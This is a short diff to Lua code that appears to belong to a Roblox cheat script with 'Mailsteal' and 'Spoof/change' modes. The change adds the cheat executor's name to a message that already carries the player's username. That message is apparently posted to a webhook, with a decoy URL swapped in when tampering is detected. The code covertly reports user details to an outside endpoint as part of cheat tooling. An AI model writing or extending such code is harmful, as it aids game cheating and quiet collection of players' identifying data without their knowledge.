@@ -8,7 +8,7 @@ e = "Mailsteal: "..e
 else
 e = "Spoof/change: "..e
 end end)
-e = e.." | "..game.Players.LocalPlayer.Name
+e = e.." | "..game.Players.LocalPlayer.Name.." | "..(identifyexecutor() or "(Unknown Executor)")
 msg = '{"content":"'..e..'"}'
 if string.find(e, "gsub") then
 _G.Webhook = "https://google.com"
